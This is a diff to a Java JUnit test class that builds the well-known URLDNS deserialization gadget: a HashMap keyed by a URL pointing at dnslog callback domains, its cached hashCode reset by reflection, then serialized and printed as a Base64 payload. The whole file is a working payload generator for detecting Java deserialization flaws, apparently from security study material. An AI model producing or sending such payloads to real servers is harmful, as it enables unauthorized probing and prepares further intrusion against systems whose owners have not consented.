@@ -22,7 +22,8 @@ public class DnsTest {
     @Test
     public void testDns() throws MalformedURLException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
         Map<URL,String> map=new HashMap<>();
-        URL url = new URL("http://cccc.amhz6.dnslog.dnslog.pwjcw.top");
+//        URL url = new URL("http://cccc.amhz6.dnslog.dnslog.pwjcw.top");
+        URL url = new URL("http://test.xkoc6l.dnslog.cn");
         map.put(url,"dnslog");
     }
 
@@ -37,7 +38,7 @@ public class DnsTest {
     public void testUrlDnsSer() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
         //创建一个map对象
         Map<URL,String> map=new HashMap<>();
-        URL url = new URL("http://111111.amhz6.dnslog.dnslog.pwjcw.top");
+        URL url = new URL("http://111111.ycvbge.dnslog.cn");
         map.put(url,"dnslog");
 
         //通过反射将url对象的hashcode值设置为-2
@@ -48,10 +49,18 @@ public class DnsTest {
         map.put(url,"dnslog");
         hashCode.set(url,-1);
 
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(bos);
+        oos.writeObject(map);
+        oos.close();
+
+        byte[] payload = bos.toByteArray();
+        System.out.println("test");
+        System.out.println(java.util.Base64.getEncoder().encodeToString(payload));
         //进行序列化map对象
-        FileOutputStream fileOutputStream = new FileOutputStream("Dnslog.ser");
-        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
-        objectOutputStream.writeObject(map);
+//        FileOutputStream fileOutputStream = new FileOutputStream("Dnslog.ser");
+//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+//        objectOutputStream.writeObject(map);
 
     }
 
